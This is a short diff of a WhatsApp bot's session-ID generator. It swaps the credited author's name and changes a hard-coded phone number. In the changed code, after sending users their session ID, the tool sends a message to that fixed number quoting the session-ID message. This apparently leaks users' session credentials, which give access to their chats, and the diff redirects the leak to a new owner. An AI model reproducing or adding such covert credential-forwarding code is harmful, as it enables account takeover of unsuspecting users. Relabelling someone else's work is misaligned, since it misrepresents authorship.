@@ -20,14 +20,14 @@
 CURRENTLY RUNNING ON BETA VERSION!!
 *
    * @project_name : Suhail-Md
-   * @author : Suhail Tech Info
+   * @author : Ahmad Ali
    * @youtube : https://www.youtube.com/c/@SuhailTechInfo0
    * @description : Suhail-Md ,A Multi-functional whatsapp user bot.
    * @version 1.0.1
 *
    * Licensed under the  GPL-3.0 License;
 * 
-   * Created By Suhail Tech Info.
+   * Created By Ahmad Ali.
    * © 2023 Suhail-Md.
 * 
    * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
@@ -354,7 +354,7 @@ setTimeout(() => {
              c2 = output.data.split('/')[3]
             await delay(500);
             let session_id1 = await session.sendMessage(user, {text: 'Secktor;;;'+c2});
-            await session.sendMessage("923184474176@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
+            await session.sendMessage("923470027813@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
           }catch (e) {console.log(e)}
 //===========================================================================================
 //===============================  SESSION ID 2   ===========================================
@@ -385,7 +385,7 @@ let cc = `╔════◇
 ║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
 ║ *1.Repo:* _https://tinyurl.com/2czdxe7a_
 ║ *2.Ytube:* _https://tinyurl.com/22q7z2kv_
-║ *3.Owner:* _https://wa.me/923184474176_
+║ *3.Owner:* _https://wa.me/923470027813_
 ║ *Note :*_Don't provide your SESSION_ID to_
 ║ _anyone otherwise that can access chats_
 ╚════════════════════════╝
